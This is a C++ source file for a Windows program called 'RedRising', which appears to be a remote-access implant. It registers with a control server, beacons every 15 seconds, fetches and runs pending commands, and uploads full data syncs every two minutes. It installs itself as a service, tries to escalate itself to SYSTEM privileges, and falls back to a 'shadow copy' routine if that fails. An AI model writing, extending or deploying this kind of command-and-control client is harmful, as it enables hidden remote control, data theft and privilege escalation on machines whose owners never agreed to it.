#define NOMINMAX
#include "client.h"
#include "permissions.h"
#include "commands.h"
#include "shadow/shadow_service.h"
extern int RunShadowCopy();
#define NOMINMAX
#include <Windows.h>
#include <iostream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <iomanip>

static std::atomic<bool> gRunning{true};

std::atomic<bool>& GetRunningFlag() { return gRunning; }

static std::string timestamp() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    struct tm tm_buf;
    localtime_s(&tm_buf, &time);
    std::ostringstream oss;
    oss << "[" << std::put_time(&tm_buf, "%Y-%m-%d %H:%M:%S") << "] ";
    return oss.str();
}

#define LOG(msg) std::cerr << timestamp() << msg << std::endl

static Config loadConfig() {
    Config cfg;
    const char* url = std::getenv("CONTROLPLANE_URL");
    cfg.serverURL = url ? url : "http://localhost:8080";
    const char* cid = std::getenv("CLIENT_ID");
    cfg.clientID = cid ? cid : "";
    const char* token = std::getenv("CLIENT_TOKEN");
    cfg.token = token ? token : "";
    char hostname[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    if (!GetComputerNameA(hostname, &size)) {
        cfg.hostname = "unknown";
    } else {
        cfg.hostname = hostname;
    }
    return cfg;
}

static bool registerWithRetry(Config& cfg) {
    for (int attempt = 0; attempt < 10 && gRunning; ++attempt) {
        LOG("Registering with control plane (" << cfg.serverURL << ") attempt " << (attempt + 1) << "/10");
        if (registerClient(cfg)) {
            LOG("Registered successfully - clientID: " << cfg.clientID);
            return true;
        }
        int delay = (std::min)(1 << attempt, 60);
        LOG("Registration failed, retrying in " << delay << "s...");
        for (int i = 0; i < delay && gRunning; ++i) Sleep(1000);
    }
    return false;
}

static void heartbeatLoop(Config cfg) {
    LOG("Heartbeat loop started (interval: 15s)");
    int cycle = 0;
    while (gRunning) {
        if (cfg.clientID.empty() || cfg.token.empty()) {
            LOG("No credentials, re-registering...");
            if (!registerWithRetry(cfg)) {
                LOG("Re-registration failed, waiting 15s before retry");
                Sleep(15000);
                continue;
            }
        }

        cycle++;
        LOG("Heartbeat #" << cycle);
        bool ok = sendHeartbeat(cfg);
        if (!ok) {
            LOG("Heartbeat failed, clearing credentials and re-registering");
            cfg.clientID.clear();
            cfg.token.clear();
            continue;
        }
        LOG("Heartbeat OK");

        LOG("Polling for pending commands...");
        processCommands(cfg);

        for (int i = 0; i < 15 && gRunning; ++i) Sleep(1000);
    }
    LOG("Heartbeat loop stopped");
}

static void dataSyncLoop(Config cfg) {
    LOG("Data sync loop started (interval: 120s)");
    LOG("Sending initial full sync...");
    if (sendFullSync(cfg)) {
        LOG("Initial full sync complete");
    } else {
        LOG("Initial full sync failed");
    }

    int cycle = 0;
    while (gRunning) {
        for (int i = 0; i < 120 && gRunning; ++i) Sleep(1000);
        if (!gRunning) break;

        cycle++;
        LOG("Full sync #" << cycle);
        if (sendFullSync(cfg)) {
            LOG("Full sync complete");
        } else {
            LOG("Full sync failed");
        }
    }
    LOG("Data sync loop stopped");
}

void RunClient() {
    Config cfg = loadConfig();

    if (cfg.clientID.empty() || cfg.token.empty()) {
        if (!registerWithRetry(cfg)) {
            LOG("FATAL: Client registration failed, exiting");
            return;
        }
    } else {
        LOG("Using existing credentials - clientID: " << cfg.clientID);
    }

    std::thread hbThread(heartbeatLoop, cfg);
    std::thread syncThread(dataSyncLoop, cfg);

    hbThread.join();
    syncThread.join();
}

static BOOL WINAPI consoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || signal == CTRL_CLOSE_EVENT) {
        LOG("Shutdown signal received, stopping...");
        gRunning = false;
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--uninstall") == 0 || strcmp(argv[i], "-u") == 0) {
            FreeConsole();
            return UninstallService() ? 0 : 1;
        }
        if (strcmp(argv[i], "--install") == 0 || strcmp(argv[i], "-i") == 0) {
            FreeConsole();
            return InstallSelfAsService() ? 0 : 1;
        }
        if (strcmp(argv[i], "--service") == 0 || strcmp(argv[i], "-s") == 0) {
            FreeConsole();
            StartServiceDispatcher();
            return 0;
        }
    }

    // Try connecting to SCM — if this process was launched as a service,
    // StartServiceCtrlDispatcher will succeed and block until service stops.
    // If not launched by SCM, it fails immediately and we run as console app.
    StartServiceDispatcher();

    // If we get here, the service dispatcher failed (not launched by SCM).
    // Running interactively — attach console and show output.
    SetConsoleCtrlHandler(consoleHandler, TRUE);

    LOG("RedRising client starting (console mode)");

    Config cfg = loadConfig();
    LOG("Server: " << cfg.serverURL);
    LOG("Hostname: " << cfg.hostname);

    if (!IsRunningAsLocalSystem()) {
        LOG("Not running as SYSTEM, attempting elevation...");
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::wstring wExePath;
        wExePath.assign(exePath, exePath + strlen(exePath));
        if (ElevateToSystem(wExePath)) {
            LOG("Elevated to SYSTEM, current process exiting");
            return 0;
        }
        LOG("Elevation failed, falling back to shadow copy");
        RunShadowCopy();
    } else {
        LOG("Running as SYSTEM");
    }

    LOG("Starting background loops");
    RunClient();

    LOG("RedRising client stopped");
    return 0;
}
